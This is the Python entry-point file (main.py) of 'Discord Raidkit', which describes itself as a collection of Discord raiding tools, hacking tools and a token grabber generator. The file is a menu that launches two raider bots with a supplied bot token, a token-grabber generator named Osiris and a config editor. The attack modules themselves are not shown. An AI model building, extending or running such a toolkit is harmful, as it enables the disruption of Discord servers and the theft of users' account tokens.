"""
Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

A collection of raiding tools, hacking tools, and a token grabber generator for Discord; written in Python 3.

This program is licensed under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

main.py handles running the program.
Last updated on 21/04/23 at 01:40 UTC.
"""

import os
from asyncio.proactor_events import _ProactorBasePipeTransport

import discord
from colorama import deinit, init

import drui
from config import CONFIG_FILE_PATH, DRConfig
from tools.osiris import Osiris
from tools.raider import Raider
from utils import async_utils as au
from utils import dr_repo_utils as dru
from utils import log_utils as lu


def run_option(option: int) -> bool:
    """Run a tool based on the tool ID provided."""
    if option in {1, 2}:
        cfg = DRConfig(CONFIG_FILE_PATH)
        tool = 'Anubis' if option == 1 else 'Qetesh'
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            Raider(option, cfg).run(cfg['token'])
        except (discord.errors.HTTPException, discord.errors.LoginFailure):
            lu.scritical(lu.F_MAIN, 'run_option', 'Invalid Bot Token Provided')
            os.system('cls' if os.name == 'nt' else 'clear')
            print('Invalid Bot Token Provided\n\nEnter anything to continue: ', end='')
            input()
        except discord.errors.PrivilegedIntentsRequired:
            lu.scritical(lu.F_MAIN, 'run_option', 'Privileged Intents Required')
            os.system('cls' if os.name == 'nt' else 'clear')
            print('Privileged Intents Required\n\nEnter anything to continue: ', end='')
            input()
        except Exception as e:
            lu.scritical(lu.F_MAIN, 'run_option', f'An uncaught error occurred trying to start {tool}: {e}')
            raise SystemExit
    elif option == 3:
        Osiris().run()
    elif option == 4:
        if os.path.exists(CONFIG_FILE_PATH):
            cfg = DRConfig(CONFIG_FILE_PATH)
            cfg.prompt_config(False)
    elif option == 5:
        raise SystemExit


def main():
    dru.check_for_updates()
    while True:
        tool_id = drui.select_tool()
        if tool_id == 5:
            break
        run_option(tool_id)


if __name__ == '__main__':
    au.silence_event_loop_closed_exception(_ProactorBasePipeTransport.__del__)
    init()
    try:
        main()
    finally:
        deinit()
